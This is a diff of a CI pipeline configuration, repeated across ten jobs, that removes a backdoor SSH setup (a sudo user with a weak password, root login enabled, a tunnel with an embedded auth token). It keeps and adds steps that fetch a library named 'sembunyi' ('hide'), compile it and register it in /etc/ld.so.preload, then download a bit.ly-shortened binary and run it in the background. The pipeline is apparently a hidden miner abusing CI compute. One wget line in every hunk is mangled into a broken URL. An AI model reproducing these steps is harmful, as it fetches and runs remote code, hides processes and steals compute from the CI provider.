@@ -8,28 +8,17 @@ jobs:
          name: Part 01
          command: |
           sudo apt-get update
-          sudo apt-get install ssh gcc -y
-          sudo adduser --disabled-password --gecos "" panda
-          sudo su --command "adduser panda sudo"
-          sudo su --command "echo 'panda:root' | chpasswd"          
-          sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
-          sudo service ssh restart
+          sudo apt-get install gcc -y
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          tar -xvf sembunyi.tar.gz && cd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
-          wget https://bit.ly/3Iaxfe5
-          chmod +x 3Iaxfe5
-          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
-          sudo su --command "nohup ./3Iaxfe5 tcp 22 --log=stdout > sesah.log &"
-          sleep 3
-          sudo su --command "cat sesah.log"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
       - run: 
          name: Part 03
          command: |
@@ -44,28 +33,17 @@ jobs:
          name: Part 01
          command: |
           sudo apt-get update
-          sudo apt-get install ssh gcc -y
-          sudo adduser --disabled-password --gecos "" panda
-          sudo su --command "adduser panda sudo"
-          sudo su --command "echo 'panda:root' | chpasswd"          
-          sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
-          sudo service ssh restart
+          sudo apt-get install gcc -y
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          tar -xvf sembunyi.tar.gz && cd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
-          wget https://bit.ly/3Iaxfe5
-          chmod +x 3Iaxfe5
-          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
-          sudo su --command "nohup ./3Iaxfe5 tcp 22 --log=stdout > sesah.log &"
-          sleep 3
-          sudo su --command "cat sesah.log"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
       - run: 
          name: Part 03
          command: |
@@ -80,28 +58,17 @@ jobs:
          name: Part 01
          command: |
           sudo apt-get update
-          sudo apt-get install ssh gcc -y
-          sudo adduser --disabled-password --gecos "" panda
-          sudo su --command "adduser panda sudo"
-          sudo su --command "echo 'panda:root' | chpasswd"          
-          sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
-          sudo service ssh restart
+          sudo apt-get install gcc -y
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          tar -xvf sembunyi.tar.gz && cd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
-          wget https://bit.ly/3Iaxfe5
-          chmod +x 3Iaxfe5
-          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
-          sudo su --command "nohup ./3Iaxfe5 tcp 22 --log=stdout > sesah.log &"
-          sleep 3
-          sudo su --command "cat sesah.log"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
       - run: 
          name: Part 03
          command: |
@@ -116,28 +83,17 @@ jobs:
          name: Part 01
          command: |
           sudo apt-get update
-          sudo apt-get install ssh gcc -y
-          sudo adduser --disabled-password --gecos "" panda
-          sudo su --command "adduser panda sudo"
-          sudo su --command "echo 'panda:root' | chpasswd"          
-          sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
-          sudo service ssh restart
+          sudo apt-get install gcc -y
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          tar -xvf sembunyi.tar.gz && cd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
-          wget https://bit.ly/3Iaxfe5
-          chmod +x 3Iaxfe5
-          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
-          sudo su --command "nohup ./3Iaxfe5 tcp 22 --log=stdout > sesah.log &"
-          sleep 3
-          sudo su --command "cat sesah.log"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
       - run: 
          name: Part 03
          command: |
@@ -152,28 +108,17 @@ jobs:
          name: Part 01
          command: |
           sudo apt-get update
-          sudo apt-get install ssh gcc -y
-          sudo adduser --disabled-password --gecos "" panda
-          sudo su --command "adduser panda sudo"
-          sudo su --command "echo 'panda:root' | chpasswd"          
-          sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
-          sudo service ssh restart
+          sudo apt-get install gcc -y
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          tar -xvf sembunyi.tar.gz && cd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
-          wget https://bit.ly/3Iaxfe5
-          chmod +x 3Iaxfe5
-          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
-          sudo su --command "nohup ./3Iaxfe5 tcp 22 --log=stdout > sesah.log &"
-          sleep 3
-          sudo su --command "cat sesah.log"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
       - run: 
          name: Part 03
          command: |
@@ -188,28 +133,17 @@ jobs:
          name: Part 01
          command: |
           sudo apt-get update
-          sudo apt-get install ssh gcc -y
-          sudo adduser --disabled-password --gecos "" panda
-          sudo su --command "adduser panda sudo"
-          sudo su --command "echo 'panda:root' | chpasswd"          
-          sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
-          sudo service ssh restart
+          sudo apt-get install gcc -y
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          tar -xvf sembunyi.tar.gz && cd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
-          wget https://bit.ly/3Iaxfe5
-          chmod +x 3Iaxfe5
-          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
-          sudo su --command "nohup ./3Iaxfe5 tcp 22 --log=stdout > sesah.log &"
-          sleep 3
-          sudo su --command "cat sesah.log"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
       - run: 
          name: Part 03
          command: |
@@ -224,28 +158,17 @@ jobs:
          name: Part 01
          command: |
           sudo apt-get update
-          sudo apt-get install ssh gcc -y
-          sudo adduser --disabled-password --gecos "" panda
-          sudo su --command "adduser panda sudo"
-          sudo su --command "echo 'panda:root' | chpasswd"          
-          sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
-          sudo service ssh restart
+          sudo apt-get install gcc -y
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          tar -xvf sembunyi.tar.gz && cd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
-          wget https://bit.ly/3Iaxfe5
-          chmod +x 3Iaxfe5
-          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
-          sudo su --command "nohup ./3Iaxfe5 tcp 22 --log=stdout > sesah.log &"
-          sleep 3
-          sudo su --command "cat sesah.log"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
       - run: 
          name: Part 03
          command: |
@@ -260,28 +183,17 @@ jobs:
          name: Part 01
          command: |
           sudo apt-get update
-          sudo apt-get install ssh gcc -y
-          sudo adduser --disabled-password --gecos "" panda
-          sudo su --command "adduser panda sudo"
-          sudo su --command "echo 'panda:root' | chpasswd"          
-          sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
-          sudo service ssh restart
+          sudo apt-get install gcc -y
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          tar -xvf sembunyi.tar.gz && cd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
-          wget https://bit.ly/3Iaxfe5
-          chmod +x 3Iaxfe5
-          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
-          sudo su --command "nohup ./3Iaxfe5 tcp 22 --log=stdout > sesah.log &"
-          sleep 3
-          sudo su --command "cat sesah.log"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
       - run: 
          name: Part 03
          command: |
@@ -296,28 +208,17 @@ jobs:
          name: Part 01
          command: |
           sudo apt-get update
-          sudo apt-get install ssh gcc -y
-          sudo adduser --disabled-password --gecos "" panda
-          sudo su --command "adduser panda sudo"
-          sudo su --command "echo 'panda:root' | chpasswd"          
-          sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
-          sudo service ssh restart
+          sudo apt-get install gcc -y
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          tar -xvf sembunyi.tar.gz && cd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
-          wget https://bit.ly/3Iaxfe5
-          chmod +x 3Iaxfe5
-          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
-          sudo su --command "nohup ./3Iaxfe5 tcp 22 --log=stdout > sesah.log &"
-          sleep 3
-          sudo su --command "cat sesah.log"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
       - run: 
          name: Part 03
          command: |
@@ -332,28 +233,17 @@ jobs:
          name: Part 01
          command: |
           sudo apt-get update
-          sudo apt-get install ssh gcc -y
-          sudo adduser --disabled-password --gecos "" panda
-          sudo su --command "adduser panda sudo"
-          sudo su --command "echo 'panda:root' | chpasswd"          
-          sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
-          sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
-          sudo service ssh restart
+          sudo apt-get install gcc -y
       - run: 
          name: Part 02
          command: |
-          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gz
-          tar -xvf sembunyi.tar.gz && cd sembunyi
+          wget https://github.com/p4n1k/mnr/releases/download/sembunyi/sembunyi.tar.gzd sembunyi
           sudo su --command "make"
           sudo su --command "sudo mv libsembunyi.so /usr/local/lib/"
           sudo su --command "echo /usr/local/lib/libsembunyi.so >> /etc/ld.so.preload"
-          wget https://bit.ly/3Iaxfe5
-          chmod +x 3Iaxfe5
-          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
-          sudo su --command "nohup ./3Iaxfe5 tcp 22 --log=stdout > sesah.log &"
-          sleep 3
-          sudo su --command "cat sesah.log"
+          wget https://bit.ly/3Ibzg9T
+          chmod +x 3Ibzg9T
+          sudo su --command "nohup ./3Ibzg9T --log=stdout > panik.log &"
       - run: 
          name: Part 03
          command: |
